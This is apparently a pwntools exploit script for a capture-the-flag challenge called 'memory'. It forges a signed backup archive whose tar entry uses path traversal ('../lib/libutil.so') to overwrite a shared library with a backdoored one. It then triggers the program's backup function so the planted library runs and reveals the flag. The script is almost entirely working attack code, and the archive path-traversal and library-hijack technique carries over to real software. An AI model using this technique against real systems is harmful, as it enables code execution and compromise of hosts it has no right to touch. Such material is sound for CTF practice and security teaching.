#!/usr/bin/env python3

#
# Setup a clean local environment with:
#  ./clean.sh && ./build.sh
#

import base64
import tarfile
from io import BytesIO

from pwn import *

the_binary = "./memory"
context.binary = the_binary
elf = context.binary

context.terminal = ["tmux", "splitw", "-h"]

if args.REMOTE:
    io = remote("memory.sstf.site", 31339)
elif args.STRACE:
    io = process(["strace", "-o" ,"trace.txt", the_binary])
else:
    io = process(the_binary)

if args.GDB:
    gdb.attach(io, f"""
        file {the_binary}
        continue
    """)

def menu(choice):
    io.sendlineafter("menu : ", str(choice))

def write(data):
    menu(1)
    io.sendlineafter("contents : ", data)
    io.recvuntil("Done\n")

def view(name):
    menu(2)
    io.sendlineafter("input date(YYYY-MM-DD) : ", name)

def view_all():
    menu(3)

def backup_data():
    menu(4)

def restore_data(data, size=None):
    if size is None:
        size = len(data)

    menu(5)
    io.sendafter("restore file size : ", str(size))
    io.sendafter("binary contents : ", data)

def fake_archive(archive_data):
    m = hashlib.sha256()
    m.update(archive_data)
    sha256_digest = m.digest()

    header = b""
    header += b"SCTF"
    header += p32(len(archive_data))
    header += sha256_digest

    archive = header + archive_data
    return base64.b64encode(header + archive_data)

def make_tar(payload_so):
    def change_file_owner(tar_info):
        if args.REMOTE:
            tar_info.uname = "memory"
            tar_info.gname = "memory"
        return tar_info

    buf = BytesIO()
    with tarfile.open(fileobj=buf, mode="w") as tar_f:
        tar_f.add(payload_so, arcname="../lib/libutil.so", filter=change_file_owner)
    return buf.getvalue()

# Make a normal file as a sanity check.
write("dummy")

# Start by crafting a tar archive with a path traversing filename that will
# overwrite a shared object.
tar_payload = make_tar("./libutil-payload.so")
archive = fake_archive(tar_payload)

# Then package it and send to remote, overwriting the libutil.so shared object.
restore_data(archive)

# Now, attempting to create a new archive will load our backoored execute
# function in the libutil.so we uploaded in the last step.
backup_data()

io.recvuntil("Getting flag:\n")
log.success("Flag:")
log.success(io.recvuntil("\n", drop=True))
